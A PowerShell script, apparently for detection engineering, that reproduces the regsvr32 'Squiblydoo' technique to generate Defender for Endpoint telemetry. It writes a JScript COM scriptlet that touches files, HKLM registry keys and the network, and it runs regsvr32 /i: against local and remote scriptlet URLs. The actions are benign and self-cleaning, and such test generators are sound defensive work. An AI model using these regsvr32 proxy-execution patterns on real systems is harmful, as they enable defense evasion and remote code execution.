<#
.SYNOPSIS
    Generates benign regsvr32 Squiblydoo attack telemetry for MDE custom data
    collection before and after validation.
.DESCRIPTION
    Runs the real regsvr32 abuse patterns in a safe, self cleaning way so the
    six DeviceCustom tables can capture net new telemetry for the use case.
    Every artifact is benign and removed at the end. Runs in SYSTEM context
    under MDE Live Response, or via Azure Arc run command.

    Patterns exercised, mapped to MITRE and to the custom tables:
      Local scriptlet proxy   T1218.010  Process, Image Load, Script, File,
                                         Registry, Network. The JScript runs the
                                         file, registry, and network actions from
                                         inside regsvr32 so every row is regsvr32
                                         initiated.
      Remote scriptlet fetch  T1218.010  Process, Image Load, Network backup
      DLL self registration   T1546.015  Process, Image Load, Registry
.PARAMETER Iterations
    Number of times to repeat the full pattern set. Higher builds more volume.
.PARAMETER RemoteHost
    Host used for the remote scriptlet fetch so a real outbound connection is
    attempted. The fetch does not need to succeed to create network telemetry.
.PARAMETER Marker
    Unique string stamped into file names, script content, and registry values
    so you can hunt for exactly this run.
.PARAMETER KeepArtifacts
    Leave the benign files and registry values in place for inspection.
#>
[CmdletBinding()]
param(
    [int]$Iterations = 25,
    [string]$RemoteHost = '1.1.1.1',
    [string]$Marker = 'Regsvr32Squiblydoo',
    [switch]$KeepArtifacts
)

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'

$device = $env:COMPUTERNAME
$utc    = [DateTime]::UtcNow.ToString('yyyy-MM-ddTHH:mm:ssZ')
# Fixed lab folder that matches the Defender AV and ASR exclusion set by
# Set-Regsvr32LabExclusion.ps1 so the scriptlet actions are not blocked.
$LabDir = 'C:\ProgramData\Regsvr32SquiblydooLab'
New-Item -ItemType Directory -Path $LabDir -Force | Out-Null

$regsvr32 = "$env:SystemRoot\System32\regsvr32.exe"
$scrobj   = "$env:SystemRoot\System32\scrobj.dll"
$results  = New-Object System.Collections.Generic.List[object]

function Add-Result {
    param([string]$Table, [string]$Pattern, [int]$Count, [string]$Detail)
    $results.Add([pscustomobject]@{
        Table   = $Table
        Pattern = $Pattern
        Fired   = $Count
        Detail  = $Detail
    })
}

# Benign COM scriptlet. When regsvr32 runs it through scrobj.dll the JScript
# executes inside regsvr32, so the file, registry, and network actions below are
# all regsvr32 initiated. Every action is benign and self cleaning. The lab path
# and the HKLM Software keys match the exclusion folder and the registry rule
# scope. The literal path must match $LabDir.
$sctBody = @"
<?xml version="1.0"?>
<scriptlet>
  <registration progid="$Marker" classid="{F0001111-0000-0000-0000-0000FEEDC0DE}">
    <script language="JScript">
      <![CDATA[
        var marker = "$Marker benign scriptlet $utc";
        var uid = 0;
        try { uid = new Date().getTime(); } catch (e) {}
        try {
          var fso = new ActiveXObject("Scripting.FileSystemObject");
          var fp = "C:\\ProgramData\\Regsvr32SquiblydooLab\\$Marker" + "_" + uid + ".txt";
          var f = fso.CreateTextFile(fp, true);
          f.WriteLine(marker);
          f.Close();
          fso.DeleteFile(fp);
        } catch (e) {}
        try {
          var sh = new ActiveXObject("WScript.Shell");
          sh.RegWrite("HKLM\\Software\\$Marker\\Run_" + uid, marker, "REG_SZ");
          sh.RegWrite("HKLM\\Software\\Classes\\CLSID\\{F0001111-0000-0000-0000-0000FEEDC0DE}\\InprocServer32\\", "C:\\ProgramData\\Regsvr32SquiblydooLab\\benign.dll", "REG_SZ");
          sh.RegWrite("HKLM\\Software\\Classes\\CLSID\\{F0001111-0000-0000-0000-0000FEEDC0DE}\\InprocServer32\\ThreadingModel", "Apartment", "REG_SZ");
          sh.RegDelete("HKLM\\Software\\Classes\\CLSID\\{F0001111-0000-0000-0000-0000FEEDC0DE}\\InprocServer32\\");
          sh.RegDelete("HKLM\\Software\\Classes\\CLSID\\{F0001111-0000-0000-0000-0000FEEDC0DE}\\");
          sh.RegDelete("HKLM\\Software\\$Marker\\Run_" + uid);
        } catch (e) {}
        try {
          var http = new ActiveXObject("MSXML2.XMLHTTP.6.0");
          http.open("GET", "http://$RemoteHost/$Marker" + "_" + uid + ".txt", false);
          http.send();
        } catch (e) {}
      ]]>
    </script>
  </registration>
</scriptlet>
"@

try {
    $localSct = Join-Path $LabDir ($Marker + '_local.sct')
    Set-Content -Path $localSct -Value $sctBody -Encoding ASCII

    $procCount = 0
    $imgCount  = 0
    $netCount  = 0
    $regCount  = 0
    $fileCount = 0
    $scriptCount = 0

    for ($i = 1; $i -le $Iterations; $i++) {

        # Pattern 1. Local scriptlet proxy execution. regsvr32 loads scrobj.dll
        # and its module chain, then runs the JScript, which does the file,
        # registry, and network actions from inside regsvr32. This is what makes
        # all six custom tables regsvr32 initiated. Process, Image Load, Script,
        # File, Registry, Network.
        try {
            Start-Process -FilePath $regsvr32 `
                -ArgumentList @('/s', '/n', '/u', ("/i:" + $localSct), $scrobj) `
                -WindowStyle Hidden | Out-Null
            $procCount++; $imgCount++; $scriptCount++
            $fileCount++; $regCount++; $netCount++
            Start-Sleep -Milliseconds 300
        }
        catch { Write-Verbose ("Pattern 1 failed: {0}" -f $_.Exception.Message) }

        # Pattern 2. Remote scriptlet fetch. regsvr32 itself reaches out to pull
        # the scriptlet, so the outbound connection is regsvr32 initiated even if
        # the body never runs. Backup for the network table. Process, Image Load,
        # Network.
        try {
            $remoteUrl = ("http://{0}/{1}_{2}.sct" -f $RemoteHost, $Marker, $i)
            Start-Process -FilePath $regsvr32 `
                -ArgumentList @('/s', '/n', '/u', ("/i:" + $remoteUrl), $scrobj) `
                -WindowStyle Hidden | Out-Null
            $procCount++; $imgCount++; $netCount++
        }
        catch { Write-Verbose ("Pattern 2 failed: {0}" -f $_.Exception.Message) }

        # Pattern 3. DLL self registration. regsvr32 registers a benign in box
        # DLL, calling DllRegisterServer which loads the module chain and writes
        # its registration. The copy is written by PowerShell, so use Pattern 1
        # for the regsvr32 initiated file row. Process, Image Load, Registry.
        try {
            $dllSrc = "$env:SystemRoot\System32\scrobj.dll"
            $dllDst = Join-Path $LabDir ($Marker + ("_copy{0}.dll" -f $i))
            Copy-Item -Path $dllSrc -Destination $dllDst -Force
            Start-Process -FilePath $regsvr32 `
                -ArgumentList @('/s', $dllDst) `
                -WindowStyle Hidden | Out-Null
            $procCount++; $imgCount++
            Start-Sleep -Milliseconds 250
            Start-Process -FilePath $regsvr32 -ArgumentList @('/s', '/u', $dllDst) -WindowStyle Hidden | Out-Null
            $procCount++
            Remove-Item -LiteralPath $dllDst -Force -ErrorAction SilentlyContinue
        }
        catch { Write-Verbose ("Pattern 3 failed: {0}" -f $_.Exception.Message) }
    }

    Add-Result 'DeviceCustomProcessEvents'   'regsvr32 launches'                 $procCount   'ProcessCreated'
    Add-Result 'DeviceCustomImageLoadEvents' 'scrobj plus module chain'          $imgCount    'ImageLoaded'
    Add-Result 'DeviceCustomNetworkEvents'   'scriptlet GET plus remote fetch'   $netCount    'ConnectionAttempt or ConnectionSuccess'
    Add-Result 'DeviceCustomRegistryEvents'  'scriptlet HKLM and InprocServer32' $regCount    'RegistryValueSet'
    Add-Result 'DeviceCustomFileEvents'      'scriptlet FileSystemObject write'  $fileCount   'FileCreated'
    Add-Result 'DeviceCustomScriptEvents'    'benign scriptlet content'          $scriptCount 'AMSI script content'

    if (-not $KeepArtifacts) {
        # The scriptlet self cleans its own file and registry values. Remove any
        # leftovers here as a safety net. Keep the lab folder itself so the AV and
        # ASR exclusion stays valid for the next run.
        $fixedClsid = 'HKLM:\SOFTWARE\Classes\CLSID\{F0001111-0000-0000-0000-0000FEEDC0DE}'
        if (Test-Path $fixedClsid) { Remove-Item -Path $fixedClsid -Recurse -Force -ErrorAction SilentlyContinue }
        $markerKey = ("HKLM:\SOFTWARE\{0}" -f $Marker)
        if (Test-Path $markerKey) { Remove-Item -Path $markerKey -Recurse -Force -ErrorAction SilentlyContinue }
        Get-ChildItem -LiteralPath $LabDir -Filter ($Marker + '*') -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
        Remove-Item -LiteralPath $localSct -Force -ErrorAction SilentlyContinue
    }

    Write-Output ("Device: {0}  UTC: {1}  Marker: {2}  Iterations: {3}" -f $device, $utc, $Marker, $Iterations)
    Write-Output '----------------------------------------------------------------'
    $results | Format-Table -AutoSize | Out-String | Write-Output
    Write-Output '----------------------------------------------------------------'
    Write-Output 'Hunt after 20 to 60 minutes for the custom tables, sooner for the default tables.'
    Write-Output ("  search in (DeviceProcessEvents, DeviceImageLoadEvents, DeviceNetworkEvents, DeviceRegistryEvents, DeviceFileEvents) DeviceName has ""{0}"" and FileName =~ ""regsvr32.exe""" -f $device)
    Write-Output ("  DeviceCustomImageLoadEvents | where DeviceName has ""{0}"" and InitiatingProcessFileName =~ ""regsvr32.exe""" -f $device)
    exit 0
}
catch {
    Write-Error ("Generator failed: {0}" -f $_.Exception.Message)
    exit 1
}
